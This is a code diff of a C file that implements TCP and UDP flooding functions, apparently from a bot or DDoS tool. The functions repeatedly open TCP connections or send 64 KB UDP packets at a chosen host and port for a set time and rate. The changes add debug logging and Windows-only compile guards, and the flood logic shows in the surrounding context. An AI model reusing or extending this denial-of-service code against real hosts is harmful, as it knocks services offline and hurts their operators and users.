@@ -1,7 +1,12 @@
 #include "Flood.h"
 #include "Sockets.h"
+#include <stdio.h>
 
 void TCPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
+#ifdef _DEBUG_
+	printf("[+] TCPFlood(%s, %d, %d, %d).\n", destination, port, seconds, timespersecond);
+#endif
+#ifdef __WIN32
 	sockaddr_in input;
 	if (!GetSocketAddress(destination, &input)) return;
 	input.sin_port = htons(port);
@@ -14,7 +19,7 @@ void TCPFlood(char* destination, unsigned short port, int seconds, int timespers
 		Sleep(1000 / timespersecond);
 		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 		if (s == 0) continue;
-		
+
 		int cRes = connect(s, (sockaddr*)&input, sizeof(input));
 		if (cRes == SOCKET_ERROR) {
 			closesocket(s); continue;
@@ -25,13 +30,18 @@ void TCPFlood(char* destination, unsigned short port, int seconds, int timespers
 
 		closesocket(s);
 	}
+#endif
 }
 
 void UDPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
+#ifdef _DEBUG_
+	printf("[+] UDPFlood(%s, %d, %d, %d).\n", destination, port, seconds, timespersecond);
+#endif
+#ifdef __WIN32
 	sockaddr_in input;
 	if (!GetSocketAddress(destination, &input)) return;
 	input.sin_port = htons(port);
-	SOCKET c; 
+	SOCKET c;
 
 	char dat[65536];
 	memset(dat, 0xCC, 65536);
@@ -50,4 +60,5 @@ void UDPFlood(char* destination, unsigned short port, int seconds, int timespers
 
 		closesocket(c);
 	}
+#endif
 }
